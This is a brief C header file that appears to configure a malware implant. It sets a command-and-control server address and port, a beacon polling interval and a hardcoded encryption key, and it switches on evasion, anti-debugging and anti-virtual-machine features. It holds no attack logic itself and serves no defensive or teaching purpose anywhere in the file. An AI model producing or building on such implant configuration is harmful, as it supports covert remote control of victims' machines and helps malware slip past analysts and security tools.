#ifndef CONFIG_H
#define CONFIG_H

// C2 Server configuration
#define C2_SERVER_IP "192.168.1.100"
#define C2_PORT 443
#define C2_POLL_INTERVAL 60 // 1 minute

// Encryption settings
#define ENCRYPTION_ENABLED 1
#define ENCRYPTION_KEY "supersecretkey123"

// Evasion settings
#define EVASION_ENABLED 1
#define ANTI_DEBUG_ENABLED 1
#define ANTI_VM_ENABLED 1

#endif // CONFIG_H